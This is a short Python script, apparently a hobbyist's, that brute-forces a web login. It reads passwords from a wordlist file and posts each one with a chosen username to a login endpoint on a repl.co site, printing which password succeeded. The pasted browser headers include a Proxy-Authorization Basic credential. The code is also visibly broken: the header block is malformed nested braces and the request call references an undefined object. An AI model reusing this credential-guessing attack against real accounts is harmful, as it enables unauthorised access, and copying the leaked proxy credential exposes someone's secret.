import requests
url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
user = input("select your username : ")
haed = {
{
	"Request Headers (667 B)": {
		"headers": [
			{
				"name": "Accept",
				"value": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
			},
			{
				"name": "Accept-Encoding",
				"value": "gzip, deflate, br"
			},
			{
				"name": "Accept-Language",
				"value": "en-US,en;q=0.5"
			},
			{
				"name": "Connection",
				"value": "keep-alive"
			},
			{
				"name": "Content-Length",
				"value": "31"
			},
			{
				"name": "Content-Type",
				"value": "application/x-www-form-urlencoded"
			},
			{
				"name": "Host",
				"value": "requestswebsite.notanothercoder.repl.co"
			},
			{
				"name": "Origin",
				"value": "https://requestswebsite.notanothercoder.repl.co"
			},
			{
				"name": "Proxy-Authorization",
				"value": "Basic VEJSLTI4NDJiNWRhLTA2MTQtNGU3Yy1iNDdkLWJkMmI1MTNiMzY1ODpUQlItMjg0MmI1ZGEtMDYxNC00ZTdjLWI0N2QtYmQyYjUxM2IzNjU4"
			},
			{
				"name": "Referer",
				"value": "https://requestswebsite.notanothercoder.repl.co/"
			},
			{
				"name": "Sec-Fetch-Dest",
				"value": "document"
			},
			{
				"name": "Sec-Fetch-Mode",
				"value": "navigate"
			},
			{
				"name": "Sec-Fetch-Site",
				"value": "same-origin"
			},
			{
				"name": "Sec-Fetch-User",
				"value": "?1"
			},
			{
				"name": "Upgrade-Insecure-Requests",
				"value": "1"
			},
			{
				"name": "User-Agent",
				"value": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
			}
		]
	}
}
}
passod = open("password.txt","r").read().split()
for password in passod:
    password = password.strip()
#    print ("user and password :",user,password)
    data = {
        "username": user,
	    "password": password
    }
    req.requests.post(url=url,headers=haed,data=data)
#    if "Failed to login!" in req.text.lower():
 #       print("error password : ",password)
 #   else:
 #       print("its password : ",password)
    if req.status_code == 200 :
        print("its password : ",password)
    elif req.status_code == 403 :
        print("error password : ",password)
    else:
        print("the wibaite you block ")